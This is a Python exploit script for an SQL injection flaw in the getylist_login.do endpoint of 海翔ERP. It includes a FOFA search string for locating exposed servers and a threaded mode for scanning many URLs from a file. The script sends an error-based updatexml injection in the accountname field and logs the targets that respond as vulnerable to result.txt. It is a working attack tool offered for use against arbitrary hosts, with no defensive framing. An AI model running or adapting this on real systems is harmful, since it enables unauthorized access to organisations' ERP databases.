# 海翔ERP getylist_login.do SQL注入漏洞
# fofa:body="checkMacWaitingSecond"

import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """      ,----.                  _ __    
   ,-.--` , \  .-.,.---.   .-`.' ,`.  
  |==|-  _.-` /==/  `   \ /==/, -   \ 
  |==|   `.-.|==|-, .=., |==| _ .=. | 
 /==/_ ,    /|==|   '='  /==| , '=',| 
 |==|    .-' |==|- ,   .'|==|-  '..'  
 |==|_  ,`-._|==|_  . ,'.|==|,  |        version:1.0.0
 /==/ ,     //==/  /\ ,  )==/ - |        author :冷酷小帅
 `--`-----`` `--`-`--`--'`--`---'     
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="海翔ERP getylist_login.do SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/getylist_login.do'
    url = target + payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Connection": "close",
        "Content-Length": "77",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = "accountname test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--"
    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if '202CB962AC59075B964B07152D234B70' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞' + "\n")
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该站点:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()